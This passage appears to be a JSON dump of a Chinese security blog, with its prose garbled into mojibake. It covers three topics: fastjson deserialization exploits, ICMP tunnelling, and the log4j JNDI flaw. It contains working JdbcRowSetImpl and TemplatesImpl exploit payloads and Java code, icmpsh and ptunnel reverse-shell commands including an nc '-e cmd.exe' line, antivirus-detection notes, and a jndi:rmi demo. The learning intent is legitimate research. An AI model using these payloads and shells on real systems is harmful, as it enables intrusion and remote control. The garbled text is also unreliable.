æ–¹æ³•ã€setteræ–¹æ³•æˆ–getteræ–¹æ³•éœ€è¦å…·æœ‰å®ç°æƒ³è¦åŠŸèƒ½çš„ä»£ç ï¼Œæˆ–å¯é€šè¿‡è¿™äº›æ–¹æ³•è·³è½¬åˆ°ä¸­é—´è¡”æ¥ç±»æˆ–ç›®çš„å®ç°ç±»ã€‚ POCåˆ†æfastjsonåœ¨1.2.24ä¸‹æœ‰ä¸¤ä¸ªé€šç”¨çš„payloadï¼šJdbcRowSetImplå’ŒTemplatesImplã€‚ JdbcRowSetImplä»ä»¥ä¸‹payloadå¯ä»¥çœ‹å‡ºæ˜¯é€šè¿‡JNDIæ³¨å…¥å®ç°å‘½ä»¤æ‰§è¡Œçš„ï¼Œæ­å¥½RMIæœåŠ¡åï¼Œåœ¨Runtimeçš„execæ–¹æ³•ä¸‹ä¸ªæ–­ç‚¹ã€‚ 1{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:8888/Calc&quot;,&quot;autoCommit&quot;:true} è°ƒç”¨æ ˆå¾ˆç®€å•ï¼Œåœ¨setAutoCommitæ–¹æ³•è°ƒç”¨connnetæ–¹æ³•ï¼Œè€Œconnnetæ–¹æ³•åˆä½¿ç”¨æˆ‘ä»¬è®¾ç½®çš„JNDIå­—ç¬¦ä¸²è°ƒç”¨lookupæ–¹æ³•ï¼ŒåŠ è½½æ¶æ„çš„å·¥å‚ç±»å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚å½“ç„¶ä¹Ÿå› ä¸ºæ˜¯JNDIçš„åˆ©ç”¨æ–¹å¼ï¼Œåœ¨ä¸€äº›ä½ç‰ˆæœ¬JDKç¯å¢ƒä¸‹æ‰èƒ½åˆ©ç”¨æˆåŠŸã€‚ TemplatesImplTemplatesImplçš„POCæ„é€ æ¯”JdbcRowSetImplå¤æ‚äº›ï¼Œè€Œä¸”å¯¹ååºåˆ—åŒ–çš„SerializerFeatureå‚æ•°æœ‰è¦æ±‚ï¼Œä½¿ç”¨parseObjectæ—¶éœ€è¦JSON.parseObject(json, Object.class, Feature.SupportNonPublicField)ï¼Œparseæ–¹æ³•æ—¶éœ€è¦JSON.parse(json,Feature.SupportNonPublicField)ï¼Œä½†å¥½å¤„å°±æ˜¯æ— éœ€å‡ºç½‘åŠ è½½æ¶æ„ç±»ã€‚ ä¸‹é¢æ˜¯åˆ©ç”¨ä»£ç ï¼ŒåŒæ ·åœ¨execæ–¹æ³•ä¸‹æ–­ç‚¹ç»§ç»­è°ƒè¯•ã€‚ 1234567891011121314151617181920public class Templates { public static void main(String args[]) throws Exception { ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.get(evil.class.getName()); String code = \"java.lang.Runtime.getRuntime().exec(\\\"calc\\\");\"; ctClass.makeClassInitializer().insertBefore(code); String randomClassName = \"p1ay2win\" + System.nanoTime(); ctClass.setName(randomClassName); ctClass.setSuperclass((classPool.get(AbstractTranslet.class.getName()))); byte[] evilCode = ctClass.toBytecode(); String encode = Base64.encodeBase64String(evilCode); String json = \"{\\\"@type\\\":\\\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\", \\\"_bytecodes\\\": [\\\"\" + encode + \"\\\"], \\\"_name\\\": \\\"p1ya2win\\\", \\\"_tfactory\\\": { }, \\\"_outputProperties\\\":{ }}\"; System.out.println(json); JSON.parseObject(json, Object.class, Feature.SupportNonPublicField); } public static class evil { }} è°ƒç”¨æ ˆæ˜¾ç¤ºè®¾ç½®outputPropertiesè€Œè°ƒç”¨å®ƒçš„setteræ–¹æ³•ï¼Œæ¥ç€å†é™†ç»­è°ƒç”¨newTransformeræ–¹æ³•å’ŒgetTransletInstanceæ–¹æ³•ã€‚ä¸»è¦çš„ä»£ç åœ¨getTransletInstanceæ–¹æ³•ä¸­ï¼Œå®ä¾‹åŒ–_classæ•°ç»„é‡Œç›¸åº”çš„Classå®ä¾‹ã€‚è€Œ_classæ•°ç»„æˆ‘ä»¬æ˜¯æ²¡æœ‰åœ¨jsonä¸­è®¾ç½®çš„ï¼Œå®ƒçš„èµ‹å€¼æ˜¯åœ¨ä¸Šé¢çš„defineTransletClassesæ–¹æ³•ã€‚ è·Ÿè¿›defineTransletClassesæ–¹æ³•ï¼Œä¼šé€šè¿‡TransletClassLoaderçš„defineClasså°†æˆ‘ä¼ å…¥çš„_bytecodeså­—èŠ‚è½¬æ¢ä¸ºClasså®ä¾‹ï¼Œä½†åœ¨è¿™ä¹‹å‰å’Œä¹‹åä¼šè°ƒç”¨_tfactoryçš„æ–¹æ³•å’Œåˆ¤æ–­_transletIndexæ˜¯å¦å°äº0ã€‚è¿™æ—¶å¯ä»¥åˆ©ç”¨fastjsonè‡ªåŠ¨å®ä¾‹åŒ–ä¼ ç©ºå€¼çš„å±æ€§çš„ç±»å‹çš„ç‰¹æ€§ï¼Œå°†_tfactoryåˆå§‹åŒ–ï¼Œç„¶å_transletIndexçš„é—®é¢˜ï¼Œå¯ä»¥ä»¤æ¶æ„ç±»çš„çˆ¶ç±»ä¸ºcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplåœ¨ifé‡Œç»™_transletIndexèµ‹å€¼ã€‚è¿˜æœ‰ä¸ª_nameå±æ€§ï¼Œåœ¨getTransletInstanceæ–¹æ³•é‡Œåˆ¤æ–­ä¸ºç©ºåˆ™ä¼šè¿”å›ç©ºï¼Œä¸ä¼šè¿›å…¥åˆ°å®ä¾‹åŒ–çš„æ–¹æ³•é‡Œï¼Œåœ¨è¿™é‡Œç»™_nameå±æ€§èµ‹ä»»æ„å­—ç¬¦ä¸²å€¼å³å¯ã€‚ è¿˜æœ‰ä¸ªé—®é¢˜å°±æ˜¯ï¼Œpayloadé‡Œ_bytecodesçš„å€¼ä¸ºæ•°ç»„å¥—ä¸ªbase64çš„å­—ç¬¦ä¸²ï¼Œä½†åœ¨TemplatesImplé‡Œ_bytecodesçš„ç±»å‹æ˜¯äºŒç»´æ•°ç»„å­—èŠ‚ã€‚é€šè¿‡åˆ«çš„æ–‡ç« å¾—çŸ¥fastjsonæ˜¯ä½¿ç”¨è‡ªå·±çš„IOUtilså·¥å…·ç±»å®ç°base64è§£ç çš„ï¼Œåœ¨ç›¸åº”çš„æ–¹æ³•ä¸‹æ–­ç‚¹ã€‚ObjectArrayCodecçš„deserialzeæ–¹æ³•è°ƒç”¨JSONScannerçš„bytesVAluesæ–¹æ³•è¿›è¡Œbase64è§£ç ã€‚ å†å¾€ä¸Šå‡ å±‚è·Ÿè¿›åˆ°DefaultFieldDeserializerçš„parseFieldæ–¹æ³•ï¼Œæ ¹æ®ä¸åŒçš„fieldValueDeserilizerå€¼é€šè¿‡deserialzeååºåˆ—åŒ–è·å–å±æ€§çš„å€¼ã€‚è€ŒfieldValueDeserilizerçš„å€¼åˆæ˜¯ä»ParserConfigçš„getDeserializeræ–¹æ³•è·å–ï¼Œåœ¨è¿™ä¸ªæ–¹æ³•é‡Œï¼Œæ•°ç»„ç±»å‹çš„å±æ€§ä¼šè¿”å›ObjectArrayCodecå®ä¾‹çš„derializerã€‚ObjectArrayCodecä¼šåƒè°ƒç”¨æ ˆæ‰€ç¤ºé‚£æ ·ï¼Œå¯¹æ•°ç»„ç±»å‹å±æ€§çš„base64å€¼è§£ç è¿˜åŸã€‚ å±æ€§çš„é—®é¢˜æ˜äº†äº†ï¼Œå›åˆ°TemplatesImplçš„getTransletInstanceæ–¹æ³•ï¼Œå®ä¾‹åŒ–_classClasså®ä¾‹æ•°ç»„é‡Œçš„ç±»ï¼Œæ‰§è¡Œç±»æ¶æ„ç±»é‡Œçš„é™æ€æ–¹æ³•ï¼Œè‡³æ­¤åˆ©ç”¨ç»“æŸã€‚ åè®°å¹³åº¸è¿™ä¸œè¥¿çŠ¹å¦‚ç™½è¡¬è¡£ä¸Šçš„æ±¡ç—•ï¼Œä¸€æ—¦æŸ“ä¸Šä¾¿æ°¸è¿œæ´—ä¸æ‰ï¼Œæ— å¯æŒ½å› å‚è€ƒhttps://y4er.com/post/fastjson-learn/ https://www.cnblogs.com/chengez/p/14789477.html https://www.cnblogs.com/0x7e/p/14400933.html https://paper.seebug.org/1242/#commonscollections-2","link":"/2021/10/31/fastjsonååºåˆ—åŒ–æ¼æ´å­¦ä¹ /"},{"title":"ICMPéš§é“å­¦ä¹ ç¬”è®°","text":"åŸç†ICMPåè®®é€šå¸¸ç”¨äºè¿”å›çš„é”™è¯¯ä¿¡æ¯æˆ–æ˜¯åˆ†æè·¯ç”±ï¼Œpingå’Œtracerouteä½¿ç”¨çš„å°±æ˜¯è¿™ä¸ªåè®®ã€‚é€šå¸¸ä¸¤å°è®¾å¤‡é€šä¿¡éœ€è¦é€šè¿‡ç«¯å£ï¼Œä½†åœ¨ICMPåè®®ä¸‹å°±ä¸éœ€è¦ï¼Œä¾æ®è¿™ä¸ªç‰¹ç‚¹å¯ç»•è¿‡IDSã€IPSç­‰è®¾å¤‡ã€‚ icmpshicmpshæ˜¯åŸºäºICMPåè®®ï¼Œå¯åœ¨æ”»å‡»è€…æœåŠ¡å™¨è·¨å¹³å°è¿è¡Œçš„Windowsåå¼¹shellå·¥å…·ã€‚ä¸‹é¢å…¶æ˜¯githubä¸Šçš„é¡¹ç›®åœ°å€ã€‚ https://github.com/inquisb/icmpsh ä½¿ç”¨æ–¹æ³•æŠŠicmpshé¡¹ç›®ä»githubä¸Šä¸‹è½½ä¸‹æ¥ï¼ŒæŠŠå…¶ä¸­çš„icmpsh.exeä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºã€‚ Linuxä½œä¸ºæ”»å‡»è€…æœåŠ¡å™¨åˆ™éœ€è¦å®‰è£…pythonçš„impacketåº“ï¼Œæˆ‘çš„Parrotç³»ç»Ÿä¸Šå·²å°†å®‰è£…å¥½äº†ã€‚ 12sudo apt install python-impacket run.shè„šæœ¬é‡Œè·å–ç½‘å¡å’Œipåœ°å€çš„æ–¹æ³•åœ¨æˆ‘çš„ç³»ç»Ÿé‡Œæ— æ•ˆï¼ŒäºæŠŠè·å–å‘½ä»¤ç¨å¾®æ”¹äº†ä¸€ä¸‹ï¼Œæˆ‘çš„ç½‘å¡åæ˜¯eth0ã€‚ 12IP=$(ifconfig \"eth0\" |grep \"inet \"| awk '{ print $2 }') æ¥ç€ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œrun.shè„šæœ¬ï¼Œè¾“å…¥ç›®æ ‡ä¸»æœºçš„ipåœ°å€ï¼Œå¤åˆ¶ç»™å‡ºçš„å‘½ä»¤åˆ°ç›®æ ‡ä¸»æœºè¿è¡Œã€‚ ç›®æ ‡ä¸»æœºæ‰§è¡Œå‘½ä»¤åæˆåŠŸåå¼¹shellã€‚ å…¶å®ç›´æ¥è¿è¡Œé¡¹ç›®ä¸‹çš„icmpsh_m.pyæ•ˆæœä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œä¸è¿‡è¦å…ˆæ‰‹åŠ¨å…³é—­pingå‘½ä»¤çš„ICMPåº”ç­”ã€‚ 1234sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1sudo python icmpsh_m.py ATTACKER_IP VICTIM_IP æ•°æ®åŒ…åˆ†æä½¿ç”¨tcpdumpæŠ“ä¸‹192.168.189.129å’Œ192.168.189.135ä¹‹é—´çš„æ‰€æœ‰æ•°æ®åŒ…ã€‚ 12sudo tcpdump ip host 192.168.189.129 and 192.168.189.135 -w /tmp/icmp.cap ç”¨wiresharkæ‰“å¼€å†å»åˆ°çš„æ•°æ®ï¼Œå¯ä»¥çœ‹åˆ°ä¸¤å°ä¸»æœºä¹‹é—´çš„æ•°æ®åŒ…çš„åè®®éƒ½æ˜¯ICMPã€‚ æ‰¾åˆ°äº†å¯¹è¾“å…¥å‘½ä»¤è¯·æ±‚å’Œå“åº”çš„ä¸¤ä¸ªåŒ…ï¼Œå‘ç°ä»–ä»¬çš„å†…å®¹éƒ½æ˜æ–‡å­˜å‚¨åœ¨ICMPæŠ¥æ–‡çš„Dataç»“æ„å¤„ã€‚ æ€è½¯æŸ¥æ€æƒ…å†µç”±äºèƒ½å¤Ÿç›´æ¥åå¼¹shellï¼Œåœ¨virustotalå‡ ä¹ä¸€åŠçš„å‚å•†éƒ½æŠ¥æ¯’äº†ã€‚ ä½¿ç”¨æºç ä»æ–°ç¼–è¯‘çš„ä¸Šä¼ ä¸Šå»è¯•è¯•ï¼Œåªæœ‰ä¸€ä¸ªå‚å•†æŠ¥æ¯’ã€‚ ptunnelä¸icmpshä¸€æ ·ï¼Œptunnelä¹Ÿæ˜¯åŸºäºICMPåè®®çš„å·¥å…·ï¼Œä½†ptunnelæ˜¯ä¸€ä¸ªçº¯ç²¹çš„ICMPéš§é“ï¼Œèƒ½å®ç°æ­£å‘éš§é“çš„åŠŸèƒ½ã€‚ç»æˆ‘æµ‹è¯•icmpshéœ€è¦ä¸¤å°æœºå™¨éƒ½æ˜¯å…¬ç½‘çš„æ‰èƒ½åå¼¹shellï¼Œptunnelå°±æ²¡è¿™ä¸ªé—®é¢˜ï¼Œä½†ä½¿ç”¨è¿™ä¸ªéœ€è¦ç®¡ç†å‘˜æƒé™ã€‚Kaliå’ŒParrotå·²æœ‰è¿™ä¸ªå·¥å…·ï¼Œä¹Ÿæœ‰Windowsç‰ˆï¼Œéœ€è¦è‡ªå·±ç¼–è¯‘ï¼Œä½†æ— è®ºæ˜¯æˆ‘è‡ªå·±ç¼–è¯‘çš„ï¼Œè¿˜æ˜¯GitHubä¸Šç¼–è¯‘å¥½çš„éƒ½æ²¡æ³•åœ¨Windows2012ä¸Šè¿è¡Œï¼Œå€’æ˜¯èƒ½åœ¨Windows10ä¸Šè¿è¡Œï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯ç¼–è¯‘ç¯å¢ƒçš„é—®é¢˜ï¼Œè¿˜æ˜¯ä»–WinPcapåº“çš„é—®é¢˜ã€‚ https://github.com/ptunnel-win/ptunnelï¼ˆéå®˜æ–¹ï¼Œè²Œä¼¼å®˜æ–¹æ²¡å‘åœ¨GitHubä¸Šï¼‰ è‡ªå·±ç¼–è¯‘è¦è£…å¥½MinGWã€‚ ç¼–è¯‘æ–¹æ³•ï¼šæŠŠé¡¹ç›®cloneä¸‹æ¥ï¼Œå†æŠŠWinPcapåº“ä¸‹è½½ä¸‹æ¥ï¼Œæ”¾åˆ°åŒä¸€ä¸ªé¡¹ç›®æ–‡ä»¶å¤¹é‡Œï¼Œåœ¨ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ç¼–è¯‘ã€‚ 12gcc ptunnel.c md5.c -L\".\\WpdPack\\Lib\" -I\".\\WpdPack\\Include\" -lwpcap -lwsock32 -g -Wall -DWIN32 -o ptunnel.exe ä½¿ç”¨æ–¹æ³•åå¼¹shellæœåŠ¡ç«¯ï¼š 12sudo ptunnel å®¢æˆ·ç«¯ï¼š 12ptunnel.exe -p SERVER_IP -lp 8888 -da SERVER_IP -dp 8888 æœåŠ¡çš„å‡ºç°å»ºç«‹Sessionçš„å­—æ ·æ—¢æˆåŠŸå»ºç«‹ICMPéš§é“ã€‚ ç°åœ¨æµ‹è¯•ä¸‹å†ç›®æ ‡ä¸»æœºåå¼¹ä¸ªshellï¼Œå…ˆåœ¨æ”»å‡»è€…ä¸»æœºç›‘å¬æŒ‡å®šç«¯å£ï¼Œç„¶åå†åœ¨ç›®æ ‡ä¸»æœºç”¨ncåå¼¹ä¸ªshellåˆ°æœ¬åœ°ç›‘å¬çš„ç«¯å£ã€‚æ³¨æ„é¡ºåºä¸å¯¹å¯èƒ½è¿æ¥ä¸ä¸Šï¼Œç„å­¦é—®é¢˜ã€‚ 12345678server:nc -lvpclient:nc.exe 127.0.0.1 3399 -e C:\\Windows\\System32\\cmd.exe æ˜ å°„3389æ—¢ç„¶éƒ½å»ºç«‹äº†ICMPéš§é“äº†ï¼Œä»…ä»…åå¼¹ä¸ªshellè‚¯å®šæ˜¯ä¸å¤Ÿçš„ï¼Œä¸‹é¢å°±è¯•è¯•å†…ç½‘3389é€šè¿‡ICMPéš§é“æ˜ å°„åˆ°å¤–ç½‘ã€‚ä»¥ä¸‹æ˜¯æ‹“æ‰‘å›¾ï¼š å…ˆåœ¨Attackerä¸»æœºå¼€å¯ptunnelã€‚ 12sudo ptunnel å†åœ¨Serverä¸»æœºptunnelä½œä¸ºæœåŠ¡ç«¯å¼€å¯æœ¬åœ°ç›‘å¬ç«¯å£ã€‚ 12ptunnel.exe -p 192.168.3.65 -lp 3399 -da 192.168.3.65 -dp 3399 æ¥ç€åœ¨Attackerä¸»æœºä½¿ç”¨lcxç±»çš„å·¥å…·ï¼Œå¼€å¯ç›‘å¬æ¨¡å¼ã€‚è¿™é‡Œçš„lcxç±»å·¥å…·æˆ‘ä½¿ç”¨çš„æ˜¯NATBypassï¼Œç”¨goç¼–å†™ï¼Œç¼–è¯‘æˆä¸åŒå¯æ‰§è¡Œæ–‡ä»¶åå¯è·¨å¹³å°ä½¿ç”¨ã€‚ https://github.com/cw1997/NATBypass 12./nb -listen 3399 3389 æœ€ååœ¨Serverä¸»æœºä½¿ç”¨slaveæ¨¡å¼ï¼Œè½¬å‘3389åˆ°ptunnelæœ¬åœ°ç›‘å¬çš„ç«¯å£ã€‚ 12nb.exe -slave 127.0.0.1:3389 127.0.0.1:3399 å‡ºç°accept a new clientå­—æ ·ï¼Œæ—¢æˆåŠŸå»ºç«‹è¿æ¥ã€‚ å°ç»“é€šè¿‡ICMPéš§é“æ˜ å°„3389å°±è¿™ç®€ç®€å•å•å‡ æ¡å‘½ä»¤ï¼Œä½†æ˜¯é‡åˆ°å‘½ä»¤æ‰§è¡Œé¡ºåºå’Œï¼Œä¸€å¼€å§‹ä½¿ç”¨çš„GitHubä¸Šç”¨Cå†™çš„è·¨å¹³å°lcxï¼ŒåŒç½‘æ®µèƒ½é€šè¿‡éš§é“ï¼Œä¸åŒç½‘æ®µä¸èƒ½çš„é—®é¢˜ï¼Œæ’æŸ¥èµ·æ¥èŠ±äº†ä¸€å¤©ï¼Œwtclã€‚ æ•°æ®åŒ…åˆ†æç”¨wiresharkæŠ“ä¸‹åå¼¹shellæ—¶çš„æ•°æ®åŒ…ã€‚æ²¡æœ‰ä½¿ç”¨å¯†ç æ—¶ï¼Œæ•°æ®åŒ…å†…å®¹è·Ÿicmpshä¸€æ ·ï¼Œéƒ½æ˜¯æ˜æ–‡å†™åœ¨ICMPæŠ¥æ–‡çš„Dataç»“æ„é‡Œï¼Œä½†æ˜¯Dataç»“æ„é‡Œè¿˜æœ‰å‡ åå­—èŠ‚çš„å…¶ä»–å†…å®¹ï¼Œå¯èƒ½æ˜¯è®°å½•è½¬å‘ipå’Œç«¯å£ä¹‹ç±»çš„å†…å®¹ã€‚ ä½¿ç”¨å¯†ç æ—¶åå¼¹shellçš„æ•°æ®åŒ…æ˜¯ä¸€æ ·çš„ï¼Œå¯èƒ½æ˜¯åœ¨å»ºç«‹éš§é“æ—¶æ‰è¿›è¡Œä¸€æ¬¡å¯†ç ç¡®è®¤ã€‚ æ€è½¯æŸ¥æ€æƒ…å†µptunnelåœ¨virustotalä¸Šæœ‰äº”ä¸ªå‚å•†æŠ¥æ¯’ï¼Œå…¶ä¸­ä¸€ä¸ªè¯†åˆ«å‡ºæ¥æ˜¯ptunnelï¼Œæ€»ä½“é—®é¢˜ä¸å¤§ã€‚ï¼ˆæˆ‘æ€ä¹ˆè®°å¾—æ˜¨å¤©æ‰æœ‰ä¸¤ä¸ªæŠ¥æ¯’çš„å‘¢-_-!ï¼‰ å…¶ä»–å·¥å…·å…¶ä»–ç±»ä¼¼å·¥å…·æœ‰pingtunnelï¼Œç”¨goç¼–å†™ï¼Œæ”¯æŒè½¬å‘tcpã€udpå’Œsock5ï¼Œèƒ½å¤Ÿå¼€å¹³å°ä½¿ç”¨ã€‚ä¸è¿‡æˆ‘ç”¨è¿™ä¸ªæƒ³æŠŠ3389æ˜ å°„å‡ºæ¥æ—¶ï¼Œé‡åˆ°ç‚¹é—®é¢˜ï¼Œæ²¡æ˜ å°„æˆåŠŸã€‚ åè®°ä»¥å‰ä¸çŸ¥é“pingå’Œtracerouteæœ‰çš„æ˜¯ä»€ä¹ˆåè®®ï¼Œç°åœ¨çŸ¥é“äº†æ˜¯ä»–ä»¬ç‰¹æœ‰çš„ICMPåè®®ï¼Œé€šè¿‡ICMPè¿˜äº†è§£åˆ°è¿™ä¹ˆå¤šå¦™ç”¨:D","link":"/2020/06/25/icmp_tunnel_learning_note/"},{"title":"log4jæ¼æ´åˆ†æ","text":"å‰è¨€2021 å¹´ 12 æœˆ 10 æ—¥ï¼ŒApacheå‘å¸ƒäº†å…¶ Log4j æ¡†æ¶çš„ 2.15.0 ç‰ˆï¼Œå…¶ä¸­åŒ…æ‹¬å¯¹ CVE-2021-44228 çš„ä¿®å¤ï¼Œè¿™æ˜¯ä¸€ä¸ªå½±å“ Apache Log4j 2.14.1 åŠæ›´æ—©ç‰ˆæœ¬çš„å…³é”® (CVSSv3 10) è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE) æ¼æ´ã€‚è¯¥æ¼æ´å­˜åœ¨äº Log4j å¤„ç†å™¨å¤„ç†ç‰¹åˆ¶æ—¥å¿—æ¶ˆæ¯çš„æ–¹å¼ä¸­ã€‚ä¸å¯ä¿¡çš„å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚ï¼Œæ¥è‡ªè¾“å…¥æ–‡æœ¬å­—æ®µçš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ Web åº”ç”¨ç¨‹åºæœç´¢æ¡†ï¼‰åŒ…å«çš„å†…å®¹${jndi:ldap://example.com/a}ï¼Œå¦‚æœå¯ç”¨äº†æ¶ˆæ¯æŸ¥æ‰¾æ›¿æ¢ï¼Œå°†è§¦å‘è¿œç¨‹ç±»åŠ è½½ã€æ¶ˆæ¯æŸ¥æ‰¾å’Œç›¸å…³å†…å®¹çš„æ‰§è¡Œã€‚æˆåŠŸåˆ©ç”¨ CVE-2021-44228 å¯ä»¥è®©æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…å®Œå…¨æ§åˆ¶æ˜“å—æ”»å‡»çš„ç›®æ ‡ç³»ç»Ÿã€‚ ç®€ä»‹Log4jæ˜¯Apacheçš„ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œé€šè¿‡ä½¿ç”¨Log4jï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶æ—¥å¿—ä¿¡æ¯è¾“é€çš„ç›®çš„åœ°æ˜¯æ§åˆ¶å°ã€æ–‡ä»¶ã€GUIç»„ä»¶ï¼Œç”šè‡³æ˜¯å¥—æ¥å£æœåŠ¡å™¨ã€NTçš„äº‹ä»¶è®°å½•å™¨ã€UNIX Syslogå®ˆæŠ¤è¿›ç¨‹ç­‰ï¼›æˆ‘ä»¬ä¹Ÿå¯ä»¥æ§åˆ¶æ¯ä¸€æ¡æ—¥å¿—çš„è¾“å‡ºæ ¼å¼ï¼›é€šè¿‡å®šä¹‰æ¯ä¸€æ¡æ—¥å¿—ä¿¡æ¯çš„çº§åˆ«ï¼Œæˆ‘ä»¬èƒ½å¤Ÿæ›´åŠ ç»†è‡´åœ°æ§åˆ¶æ—¥å¿—çš„ç”Ÿæˆè¿‡ç¨‹ã€‚ Lookupæä¾›äº†ä¸€ç§åœ¨ä»»æ„ä½ç½®å‘ Log4j é…ç½®æ·»åŠ å€¼çš„æ–¹æ³•ã€‚å®ƒä»¬æ˜¯å®ç°StrLookupæ¥å£çš„ç‰¹å®šç±»å‹çš„æ’ä»¶ã€‚Lookupè¯­æ³•ä¸º${prefix:name}ï¼Œå…¶ä¸­å‰ç¼€æ ‡è¯†å‘Šè¯‰Log4jåº”åœ¨ç‰¹å®šä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨çš„å˜é‡åç§°ã€‚ å‰ç¼€ ä¸Šä¸‹æ–‡ bundle èµ„æºæŸã€‚æ ¼å¼ä¸ºbundle:BundleName:BundleKeyã€‚æ†ç»‘åŒ…åç§°éµå¾ªåŒ…å‘½åçº¦å®šï¼Œå¦‚ï¼š {bundle:com.domain.Messages:MyKey}ã€‚ ctx çº¿ç¨‹ä¸Šä¸‹æ–‡æ˜ å°„ï¼ˆMDCï¼‰ã€‚ date ä½¿ç”¨æŒ‡å®šçš„æ ¼å¼æ’å…¥å½“å‰æ—¥æœŸå’Œ/æˆ–æ—¶é—´ã€‚ env ç³»ç»Ÿç¯å¢ƒå˜é‡ã€‚ jndi åœ¨é»˜è®¤çš„JNDIä¸Šä¸‹æ–‡ä¸­è®¾ç½®çš„å€¼ã€‚ jvmrunargs é€šè¿‡JMXè®¿é—®çš„JVMè¾“å…¥å‚æ•°ï¼Œä½†ä¸æ˜¯ä¸»è¦å‚æ•°; è¯·å‚é˜…RuntimeMXBean.getInputArgumentsåœ¨Androidä¸Šä¸å¯ç”¨ log4j Log4jé…ç½®å±æ€§ã€‚è¡¨è¾¾å¼log4j:configLocationå’Œlog4j:configLocationå’Œ{log4j:configParentLocation}åˆ†åˆ«æä¾›ç»™log4jçš„é…ç½®æ–‡ä»¶å’Œå®ƒçš„çˆ¶æ–‡ä»¶å¤¹çš„ç»å¯¹è·¯å¾„ã€‚ main ä½¿ç”¨ MapLookup.setMainArguments(String[])è®¾ç½®çš„å€¼ã€‚ map æ¥è‡ªMapMessageçš„å€¼ã€‚ sd æ¥è‡ªStructuredDataMessageçš„å€¼ã€‚â€œidâ€å°†è¿”å›æ²¡æœ‰ä¼ä¸šå·çš„StructuredDataIdçš„åç§°ã€‚â€œtypeâ€å°†è¿”å›æ¶ˆæ¯ç±»å‹ã€‚å…¶ä»–é”®å°†ä»Mapä¸­å–å›å•ä¸ªå…ƒç´ ã€‚ sys ç³»ç»Ÿå±æ€§ã€‚ æ¼æ´åˆ†ææ¼æ´è§¦å‘é€‰ç”¨log4j-core 2.14.1ç‰ˆæœ¬ï¼Œä½¿ç”¨ä»¥ä¸‹ä»£ç ä½œä¸ºdemoã€‚å¯åŠ¨ä¸€ä¸ªæ¶æ„çš„RMIæˆ–LDAPæœåŠ¡ï¼Œæ‰§è¡Œdemoå³å¯è§¦å‘ã€‚ 1234567891011import org.apache.logging.log4j.Logger;import org.apache.logging.log4j.LogManager;public class Log4jJNDI { private static final Logger logger = LogManager.getLogger(Log4jJNDI.class); public static void main(String[] args) { System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\"); System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\"); logger.error(\"${jndi:rmi://127.0.0.1:8888/Calc}\"); }} ä»£ç åˆ†æè·Ÿè¿›åˆ°org.apache.logging.log4j.core.pattern.MessagePatternConverter#formatï¼Œè‹¥æœªè®¾ç½®nolookupä¸ºtrueï¼Œéå†è¦è¾“å‡ºçš„æ—¥å¿—ï¼Œ$ç¬¦å·å’Œ{ç¬¦å·ç›¸ç»§å‡ºç°åˆ™ä¼šåœ¨åç»­å°†èŠ±æ‹¬å·ä¸­çš„å†…å®¹ä½œå¤„ç†ã€‚nolookupåœ¨log4j 2.15.0ä¹‹å‰æ˜¯é»˜è®¤å…³é—­çš„ã€‚ å†è·Ÿè¿›åˆ°org.apache.logging.log4j.core.lookup.StrSubstitutor#substituteï¼Œåœ¨è¿™é‡Œä¼šä»å¤–åˆ°å†…é€’å½’${å’Œ}å†…çš„å†…å®¹ï¼Œç„¶åä½¿ç”¨é€šäº†ä¸­çš„resolveVariableæ–¹æ³•è§£æå¹¶è¿”å›å®ƒçš„å€¼ã€‚ åœ¨resolveVariableæ–¹æ³•é‡Œæ”¯æŒè§£æçš„å‰ç¼€æœ‰date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4jï¼Œå®æµ‹åœ¨Springæ¡†æ¶ä¸‹æ”¯æŒè§£æçš„å‰ç¼€ä¼šæœ‰æ‰€ä¸åŒã€‚ ç»§ç»­è·Ÿè¿›org.apache.logging.log4j.core.lookup.Interpolator#lookupï¼Œæ ¹æ®å‰ç¼€ä»strLookupMapå±æ€§ä¸­è·å–ç›¸åº”çš„Lookupç±»å®ä¾‹ã€‚è¿™é‡Œè·å–çš„æ˜¯JndiLookupçš„å®ä¾‹ï¼Œå¹¶è°ƒç”¨è¯¥å®ä¾‹çš„lookupæ–¹æ³•ã€‚ JndiLookupçš„lookupæ–¹æ³•é‡Œï¼Œè°ƒç”¨org.apache.logging.log4j.core.net.jndiManagerçš„getDefaultManageré™æ€æ–¹æ³•ï¼Œè¿”å›JndiManagerå®ä¾‹ï¼Œå…¶ä¸­çš„contextå±æ€§è¢«è®¾ç½®ä¸ºInitialContextå¯¹è±¡ã€‚ ç„¶åè°ƒç”¨JndiManagerå®ä¾‹çš„lookupæ–¹æ³•ï¼Œå®é™…å°±æ˜¯å®ƒçš„contextå±æ€§InitialContextçš„lookupæ–¹æ³•ï¼Œåç»­æµç¨‹å°±å¦‚å¸¸è§„JNDIæ³¨å…¥ï¼ŒåŠ è½½è¿œç¨‹çš„æ¶æ„ç±»æ‰§è¡Œå…¶ä¸­çš„æ¶æ„ä»£ç ã€‚ RC1ä¿®å¤ç»•è¿‡log4jåœ¨RC1ä¸­å¯¹JNDIæ³¨å…¥é—®é¢˜çš„ä¿®å¤å­˜åœ¨äºgithubçš„commitè®°å½•LOG4J2-3201ä¸­ã€‚åœ¨JndiManagerç±»é‡Œå¯¹ååºåˆ—åŒ–çš„ç±»å’ŒJNDIæœåŠ¡å™¨åœ°å€åšäº†ç™½åå•æ ¡éªŒã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public 